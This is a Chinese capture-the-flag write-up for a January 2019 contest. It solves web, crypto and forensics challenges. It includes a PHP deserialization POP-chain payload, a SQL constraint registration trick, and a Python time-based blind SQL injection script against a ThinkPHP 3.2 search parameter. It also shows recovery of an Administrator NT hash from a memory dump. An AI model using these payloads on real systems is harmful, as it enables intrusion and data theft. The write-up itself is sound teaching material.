> 原文链接: https://www.anquanke.com//post/id/170341 


# 2019安恒1月月赛Writeip-Web&amp;Crypto&amp;Misc


                                阅读量   
                                **289418**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01f38eb9d608f865ea.png)](https://p3.ssl.qhimg.com/t01f38eb9d608f865ea.png)



## 前言

周末在家无聊，又刷了一次安恒月赛，以下是题解



## Web

### <a class="reference-link" name="babygo"></a>babygo

拿到题目

```
&lt;?php  
@error_reporting(1); 
include 'flag.php';
class baby 
`{`   
    protected $skyobj;  
    public $aaa;
    public $bbb;
    function __construct() 
    `{`      
        $this-&gt;skyobj = new sec;
    `}`  
    function __toString()      
    `{`          
        if (isset($this-&gt;skyobj))  
            return $this-&gt;skyobj-&gt;read();      
    `}`  
`}`  

class cool 
`{`    
    public $filename;     
    public $nice;
    public $amzing; 
    function read()      
    `{`   
        $this-&gt;nice = unserialize($this-&gt;amzing);
        $this-&gt;nice-&gt;aaa = $sth;
        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)
        `{`
            $file = "./`{`$this-&gt;filename`}`";        
            if (file_get_contents($file))         
            `{`              
                return file_get_contents($file); 
            `}`  
            else 
            `{` 
                return "you must be joking!"; 
            `}`    
        `}`
    `}`  
`}`  

class sec 
`{`  
    function read()     
    `{`          
        return "it's so sec~~";      
    `}`  
`}`  

if (isset($_GET['data']))  
`{` 
    $Input_data = unserialize($_GET['data']);
    echo $Input_data; 
`}` 
else 
`{` 
    highlight_file("./index.php"); 
`}` 
?&gt;
```

发现是一个简单的反序列化题目<br>
我们发现只要满足

```
$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb
```

即可读文件<br>[![](https://p2.ssl.qhimg.com/t010b464ffe6d60e599.png)](https://p2.ssl.qhimg.com/t010b464ffe6d60e599.png)<br>
那么我们利用pop链，构造<br>[![](https://p1.ssl.qhimg.com/t01f5bef0ff53222de3.png)](https://p1.ssl.qhimg.com/t01f5bef0ff53222de3.png)<br>
但是我们注意到<br>[![](https://p2.ssl.qhimg.com/t014635fad328ee1d17.png)](https://p2.ssl.qhimg.com/t014635fad328ee1d17.png)<br>
aaa会被重新赋值，所以使用指针，这样bbb会跟随aaa动态改变

```
$a = new baby();
$a-&gt;bbb =&amp;$a-&gt;aaa
```

构造出如下序列化<br>[![](https://p5.ssl.qhimg.com/t01c01f0fbe754d2a21.png)](https://p5.ssl.qhimg.com/t01c01f0fbe754d2a21.png)<br>
最后得到完整exp

```
&lt;?php  
class baby 
`{`   
    protected $skyobj;    
    public $aaa;
    public $bbb;
    function __construct() 
    `{`          
        $this-&gt;skyobj = new cool;   
    `}`  
    function __toString()      
    `{`          
        if (isset($this-&gt;skyobj))  
        `{`
            return $this-&gt;skyobj-&gt;read();      
        `}`
    `}`  
`}`  
class cool 
`{`    
    public $filename='./flag.php';     
    public $nice;
    public $amzing='O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'; 
`}`   
$a = new baby();
// $a-&gt;bbb =&amp;$a-&gt;aaa;
echo urlencode(serialize($a));
?&gt;
```

生成payload

```
O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A227%3A%22O%253A4%253A%2522baby%2522%253A3%253A%257Bs%253A9%253A%2522%2500%252A%2500skyobj%2522%253BO%253A4%253A%2522cool%2522%253A3%253A%257Bs%253A8%253A%2522filename%2522%253BN%253Bs%253A4%253A%2522nice%2522%253BN%253Bs%253A6%253A%2522amzing%2522%253BN%253B%257Ds%253A3%253A%2522aaa%2522%253BN%253Bs%253A3%253A%2522bbb%2522%253BR%253A6%253B%257D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D
```

最后可以得到<br>[![](https://p2.ssl.qhimg.com/t01e345dcd1f1496d68.png)](https://p2.ssl.qhimg.com/t01e345dcd1f1496d68.png)<br>
即

```
bd75a38e62ec0e450745a8eb8e667f5b
```

### <a class="reference-link" name="simple%20php"></a>simple php

拿到题目

```
http://101.71.29.5:10004/index.php
```

探测了一番，发现`robots.txt`

```
User-agent: *

Disallow: /ebooks
Disallow: /admin
Disallow: /xhtml/?
Disallow: /center

```

尝试

```
http://101.71.29.5:10004/admin
```

发现有登录和注册页面<br>[![](https://p1.ssl.qhimg.com/t01c593467c675a1e29.png)](https://p1.ssl.qhimg.com/t01c593467c675a1e29.png)<br>
探测后，发现是sql约束攻击<br>
注册

```
username = admin                                                                                1
password = 12345678
```

登录即可

```
http://101.71.29.5:10004/Admin/User/Index
```

[![](https://p2.ssl.qhimg.com/t0172917c8ff4f6b6a1.png)](https://p2.ssl.qhimg.com/t0172917c8ff4f6b6a1.png)<br>
发现是搜索框，并且是tp3.2<br>
不难想到注入漏洞，随手尝试报错id

```
http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and polygon(id)--
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011c9df761f621f55f.png)<br>
发现库名`tpctf`，表名`flag`，根据经验猜测字段名是否为flag

```
http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and polygon(flag)--
```

[![](https://p5.ssl.qhimg.com/t01baaee4ad7f2434b9.png)](https://p5.ssl.qhimg.com/t01baaee4ad7f2434b9.png)<br>
nice，发现flag字段也存在，省了不少事<br>
下面是思考如何注入得到数据,随手测试

```
http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if(1,sleep(3),0)--
```

[![](https://p2.ssl.qhimg.com/t011de69367f680bdba.png)](https://p2.ssl.qhimg.com/t011de69367f680bdba.png)<br>
发现成功sleep 3s,轻松写出exp

```
import requests
flag = ''
cookies = `{`
    'PHPSESSID': 're4g49sil8hfh4ovfrk7ln1o02'
`}`
for i in range(1,33):
    for j in '0123456789abcdef':
        url = 'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'+str(i)+',1))='+str(ord(j))+'),sleep(3),0)--'
        try:
            r = requests.get(url=url,timeout=2.5,cookies=cookies)
        except:
            flag += j
            print flag
            break
```

但是有点恶心的是，好像每隔5分钟就要重新注册，登录一遍，断断续续跑了几次，得到flag<br>[![](https://p0.ssl.qhimg.com/t01405c5c3c1e695e5f.png)](https://p0.ssl.qhimg.com/t01405c5c3c1e695e5f.png)

```
459a1b6ea697453c60132386a5f572d6
```



## Crypto

### <a class="reference-link" name="Get%20it"></a>Get it

题目描述

```
Alice和Bob正在进行通信，作为中间人的Eve一直在窃听他们两人的通信。

Eve窃听到这样一段内容，主要内容如下：
p = 37
A = 17
B = 31

U2FsdGVkX1+mrbv3nUfzAjMY1kzM5P7ok/TzFCTFGs7ivutKLBLGbZxOfFebNdb2
l7V38e7I2ywU+BW/2dOTWIWnubAzhMN+jzlqbX6dD1rmGEd21sEAp40IQXmN/Y0O
K4nCu4xEuJsNsTJZhk50NaPTDk7J7J+wBsScdV0fIfe23pRg58qzdVljCOzosb62
7oPwxidBEPuxs4WYehm+15zjw2cw03qeOyaXnH/yeqytKUxKqe2L5fytlr6FybZw
HkYlPZ7JarNOIhO2OP3n53OZ1zFhwzTvjf7MVPsTAnZYc+OF2tqJS5mgWkWXnPal
+A2lWQgmVxCsjl1DLkQiWy+bFY3W/X59QZ1GEQFY1xqUFA4xCPkUgB+G6AC8DTpK
ix5+Grt91ie09Ye/SgBliKdt5BdPZplp0oJWdS8Iy0bqfF7voKX3VgTwRaCENgXl
VwhPEOslBJRh6Pk0cA0kUzyOQ+xFh82YTrNBX6xtucMhfoenc2XDCLp+qGVW9Kj6
m5lSYiFFd0E=

分析得知，他们是在公共信道上交换加密密钥，共同建立共享密钥。

而上面这段密文是Alice和Bob使用自己的密值和共享秘钥，组成一串字符的md5值的前16位字符作为密码使用另外一种加密算法加密明文得到的。

例如Alice的密值为3，Bob的密值为6，共享秘钥为35，那么密码为：

password = hashlib.md5("(3,6,35)").hexdigest()[0:16]
```

看到密钥交换和给定的3个参数，不难想到是Diffie-Hellman密钥交换算法<br>
那么我们现在知道<br>
1.A的公钥为17<br>
2.B的公钥为31<br>
3.素数p为37<br>
那么第一步是先求g<br>
我们知道g是p的一个模p本原单位根(primitive root module p)，所谓本原单位根就是指在模p乘法运算下，g的1次方，2次方……(p-1)次方这p-1个数互不相同，并且取遍1到p-1；<br>
我们直接调用sagemath的函数

```
print primitive_root(37)
```

可以得到

```
g=2
```

然后我们知道

```
A = g^a mod p
B = g^b mod p
```

即已知A,B,g,p怎么求a和b<br>
因为这里的数都比较小，我们使用在线网站

```
https://www.alpertron.com.ar/DILOG.HTM
```

对于A的私钥，我们得到<br>[![](https://p2.ssl.qhimg.com/t01c6593179989fb87d.png)](https://p2.ssl.qhimg.com/t01c6593179989fb87d.png)<br>
对于B的私钥，我们得到<br>[![](https://p0.ssl.qhimg.com/t0136877281e6f72fc8.png)](https://p0.ssl.qhimg.com/t0136877281e6f72fc8.png)<br>
而对于共享密钥

```
key =  g^(b*a) mod p
```

计算

```
a = 7
b = 9
g = 2
p = 37
print pow(g,a*b,p)
```

得到共享密钥为6<br>
于是按照样例

```
例如Alice的密值为3，Bob的密值为6，共享秘钥为35，那么密码为：

password = hashlib.md5("(3,6,35)").hexdigest()[0:16]
```

我们得到password

```
import hashlib
password = hashlib.md5("(7,9,6)").hexdigest()[0:16]
print password
```

结果`a7ece9d133c9ec03`<br>
而对于密文

```
U2FsdGVkX1+mrbv3nUfzAjMY1kzM5P7ok/TzFCTFGs7ivutKLBLGbZxOfFebNdb2
l7V38e7I2ywU+BW/2dOTWIWnubAzhMN+jzlqbX6dD1rmGEd21sEAp40IQXmN/Y0O
K4nCu4xEuJsNsTJZhk50NaPTDk7J7J+wBsScdV0fIfe23pRg58qzdVljCOzosb62
7oPwxidBEPuxs4WYehm+15zjw2cw03qeOyaXnH/yeqytKUxKqe2L5fytlr6FybZw
HkYlPZ7JarNOIhO2OP3n53OZ1zFhwzTvjf7MVPsTAnZYc+OF2tqJS5mgWkWXnPal
+A2lWQgmVxCsjl1DLkQiWy+bFY3W/X59QZ1GEQFY1xqUFA4xCPkUgB+G6AC8DTpK
ix5+Grt91ie09Ye/SgBliKdt5BdPZplp0oJWdS8Iy0bqfF7voKX3VgTwRaCENgXl
VwhPEOslBJRh6Pk0cA0kUzyOQ+xFh82YTrNBX6xtucMhfoenc2XDCLp+qGVW9Kj6
m5lSYiFFd0E=
```

看到`U2F`这样的开头，我们尝试解密RC4,AES,DES<br>
最后发现DES成功解密<br>[![](https://p1.ssl.qhimg.com/t014b0a1656a0fc029f.png)](https://p1.ssl.qhimg.com/t014b0a1656a0fc029f.png)<br>
成功得到flag：`flag`{`8598544ba1a5713b1de04d3f0c41eb71`}``

### <a class="reference-link" name="%E9%94%AE%E7%9B%98%E4%B9%8B%E4%BA%89"></a>键盘之争

看到题目名称键盘之争<br>
以及唯一的信息`ypau_kjg;"g;"ypau+`<br>
先去百度了下<br>[![](https://p1.ssl.qhimg.com/t01038157b15a5e5117.png)](https://p1.ssl.qhimg.com/t01038157b15a5e5117.png)<br>
发现第一项就是键盘之争，看来是有一个键位布局的映射关系<br>
于是按照图片<br>[![](https://p4.ssl.qhimg.com/t01de1036009803dd5e.png)](https://p4.ssl.qhimg.com/t01de1036009803dd5e.png)<br>[![](https://p5.ssl.qhimg.com/t015915317288ee3ec9.png)](https://p5.ssl.qhimg.com/t015915317288ee3ec9.png)<br>
简单写了个映射代码

```
QWERTY = ['q','w','e','r','t','y','u','i','o','p','`{`','`}`','|','a','s','d','f','g','h','j','k','l',';','"','z','x','c','v','b','n','m','&lt;','&gt;','?','_','+']
Dvorak = ['"','&lt;','&gt;','p','y','f','g','c','r','l','?','+','|','a','o','e','u','i','d','h','t','n','s','_',';','q','j','k','x','b','m','w','v','z','`{`','`}`']
dic = zip(Dvorak,QWERTY)

c = 'ypau_kjg;"g;"ypau+'
res=''
for i in c:
    for key,value in dic:
        if key == i:
            res += value
print res
```

得到结果

```
traf"vcuzquzqtraf`}`
```

看到有双引号感觉怪怪的，于是尝试

```
dic = zip(QWERTY,Dvorak)
```

于是得到结果

```
flag`{`this_is_flag`}`
```

这就美滋滋了，md5后得到flag

```
951c712ac2c3e57053c43d80c0a9e543
```



## Misc

### <a class="reference-link" name="memory"></a>memory

拿到题目，既然要拿管理员密码，我们先查看下profile类型<br>[![](https://p5.ssl.qhimg.com/t018187ad194ac306ec.png)](https://p5.ssl.qhimg.com/t018187ad194ac306ec.png)<br>
得到类型为`WinXPSP2x86`<br>
紧接着查注册表位置，找到system和sam key的起始位置<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01a7cfba97346ec774.png)<br>
然后将其值导出<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t017bd283e03702d95f.png)<br>
得到<br>[![](https://p2.ssl.qhimg.com/t0193046c22dd7a2fb8.png)](https://p2.ssl.qhimg.com/t0193046c22dd7a2fb8.png)<br>
获得Administrator的`NThash:c22b315c040ae6e0efee3518d830362b`<br>
拿去破解<br>[![](https://p4.ssl.qhimg.com/t0180825706f379d3c5.png)](https://p4.ssl.qhimg.com/t0180825706f379d3c5.png)<br>
得到密码123456789<br>
MD5后提交

```
25f9e794323b453885f5181f1b624d0b
```

### <a class="reference-link" name="%E8%B5%A2%E6%88%982019"></a>赢战2019

拿到图片先binwalk一下<br>[![](https://p2.ssl.qhimg.com/t01685b18daa6062d68.png)](https://p2.ssl.qhimg.com/t01685b18daa6062d68.png)<br>
尝试提取里面的图片<br>[![](https://p0.ssl.qhimg.com/t018f1b4657239033a5.png)](https://p0.ssl.qhimg.com/t018f1b4657239033a5.png)<br>
得到提取后的图片<br>[![](https://p2.ssl.qhimg.com/t01eb02933de66c7040.png)](https://p2.ssl.qhimg.com/t01eb02933de66c7040.png)<br>
扫描一下<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0113a45222a256fb85.png)<br>
发现还有，于是用stegsolve打开<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ba1ecbdec538588c.png)<br>
发现flag

```
flag`{`You_ARE_SOsmart`}`
```
